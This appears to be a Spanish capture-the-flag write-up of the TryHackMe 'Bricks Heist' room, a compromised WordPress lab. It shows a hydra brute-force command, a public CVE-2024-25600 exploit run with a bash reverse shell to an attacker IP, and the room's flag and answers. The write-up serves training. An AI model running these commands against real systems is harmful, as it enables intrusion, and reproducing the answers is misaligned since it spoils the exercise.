---
title: "TryHack3M: Bricks"
platform: "HTB"
publishedAt: 2025-05-22
cover: "/images/ctf/bricks-heistt.webp"
---

---


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5e19dbac-6f69-4b8e-8f73-8ef638bf2a2c/8415f495-a0a4-4a8d-b258-ce28be57dfa6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TVF5HTBT%2F20250511%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250511T034514Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEAsaCXVzLXdlc3QtMiJGMEQCID%2F59gd8NvDCvqp3QP8dsqLBIRg4m8JY3cp9OIXYUJ8tAiAwLRy39eVS%2FwglTpFiKV18ayfQmx3xG55NmbMYGgm3aCqIBAi0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMYSYK7Phq%2BezAYkP1KtwDljf99NUwHxw5G%2FukvJ9xGpfKF9vxfEaxdR3JKCtarL0tcQpTwEOww9qlwK%2BG69NjgZojHMUkBjHICsSFzAgLwpjWrITt58GikeJvCZTOtOdpUjFOpcQ7fSGOVhIKNuajpmkbb0XdniqM9Yfzbq4XXZw9hnM7B07g4z9wGbK1rZX%2FJN9lgT2bskOFLANCC25K3ROdyJIeVmFDLvLIUwu9qp7Ov9LivUUQaruydIPVzn8f2%2FSA8roUgDBQTbcuzoj4FjZyj930KSxVSPrt%2BzVXv4ogKbkpLpafqW7%2FsE46iJxoLkJOv3yx1M%2FDfKXrIjKsPnO4EV%2BjtedEBvFZ%2BBlkepa7tfwf8oPiT%2BKjNCie4c8M07yDKrSrOyJI9BSCJddwgWi2vVagq3FgdZZNUJUQx7NU90fnd61ADsW8CQ3AJFc%2F2bN1J9XlRkxCtfa3%2FMNXl7cPzLO1oUC0Eb0imxqIRABqbZVpXEuntuNh70Pwud4mStbnOowApM9atce6q1f3paSpFhui74sIehstoPbe3AS%2BmGcBn3RXSE5UsURZGDENmmwBruKqzx9tqyYegZS7AMxqGsNA0PYdI4OaJ8Ptr70qlXQ7CFP60%2BHK5WwS2utRi8q2UJHtGHzMUR4wg6uAwQY6pgHaLSV1lvRjvraxmlxKz67IMa3gr1sXU7CBuqAS8iZ%2BLy8eP18wdVkSPIbeWYIpdo1D0f5agb4NQnoy3ZwUiiaoGoxpnk%2FrB8NTpK%2Be08uoRd6%2B0d%2BZRoqRF44HK6bMwiSvYDK8Ad8EXXyX8w%2BUd7C9TdaQE3kM%2F0jiOXqPTtaNaRYGb4LSTi0OG2pCM8xKXmSPdnAuqbNzL1ghMVJX7cY8UVksqy10&X-Amz-Signature=3823a3d28e805b5a1bfbdb1d229b68b01f7ad05a2a3ac120e498f15e8e5fa10e&X-Amz-SignedHeaders=host&x-id=GetObject)


# 🧱 Bricks Heist – TryHackMe (Write-up)


## 🕵️ Introducción


Un sitio web WordPress fue comprometido. Nuestra misión: identificar el punto de entrada, recuperar acceso como administrador, detectar actividad maliciosa (minería), y rastrear al grupo de amenazas involucrado.


---


## 🔍 1. Escaneo inicial


```shell
bash
CopyEdit
nmap -sCV -p- 10.10.72.226
```


Servicios expuestos:

- 22: SSH
- 80: WebSockify (error 405)
- 443: WordPress 6.5
- 3306: MySQL (sin acceso)

---


## 🧱 2. Enumeración de WordPress

- Se detecta **tema activo: Bricks**
- Vulnerabilidad conocida: **CVE-2024-25600**
- Exploit público descargado desde GitHub

---


## 🔓 3. Acceso administrativo


Se obtuvo login con `administrator`, mediante fuerza bruta con `hydra`:


```shell
bash
CopyEdit
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


---


## 💣 4. Exploiting CVE-2024-25600


Se usó el script:


```shell
bash
CopyEdit
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```


Ejemplo:


```shell
bash
CopyEdit
python3 CVE-2024-25600.py \
  --url https://bricks.thm \
  --username administrator \
  --password TU_PASS \
  --cmd "bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'"
```


Se obtuvo **shell interactiva**.


---


## 🐚 5. Post-explotación


### Flag encontrada:


```plain text
css
CopyEdit
/var/www/html/650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```


---


## 🔍 6. Proceso y servicio sospechoso


### Proceso:


```plain text
pgsql
CopyEdit
nm-inet-dialog
```


### Servicio malicioso:


```plain text
CopyEdit
ubuntu.service - TRYHACK3M
```


Verificado vía:


```shell
bash
CopyEdit
systemctl status ubuntu.service
```


---


## 📄 7. Log del miner


Log activo ubicado en:


```plain text
bash
CopyEdit
/lib/NetworkManager/inet.conf
```


📌 **Respuesta (formato** **`xxxx.xxxx`****)**:


```plain text
pgsql
CopyEdit
inet.conf
```


---


## 💰 8. Wallet del miner


Del archivo `inet.conf`:


```plain text
text
CopyEdit
ID: WW1NeGNY...
```


Base64 → doble decode → wallet final:


```plain text
nginx
CopyEdit
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```


---


## 🕵️‍♂️ 9. Threat group


Wallet está asociada con el grupo de ransomware:


**LockBit**


(Confirmado por búsquedas OSINT y análisis de blockchain)


---


## ✅ Conclusión


Este CTF fue un excelente caso realista que combinó:

- Enumeración
- Explotación de CVE
- Análisis forense de logs y procesos
- Técnicas OSINT

Una gran práctica para pentesters y analistas de amenazas.

